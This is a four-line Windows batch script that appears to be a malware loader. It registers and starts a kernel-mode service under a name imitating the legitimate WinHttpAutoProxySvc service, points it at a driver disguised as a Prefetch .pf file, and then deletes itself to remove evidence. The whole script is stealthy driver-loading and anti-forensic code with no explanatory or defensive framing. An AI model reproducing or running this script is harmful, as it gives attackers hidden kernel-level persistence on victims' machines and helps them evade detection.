@echo off
cd %~dp0
sc create WinHttpAutoProxySvc917_c binpath=C:\Windows\Prefetch\CMD.EXE-PF3DT6R8.pf type=kernel
sc start WinHttpAutoProxySvc917_c
del "%~f0"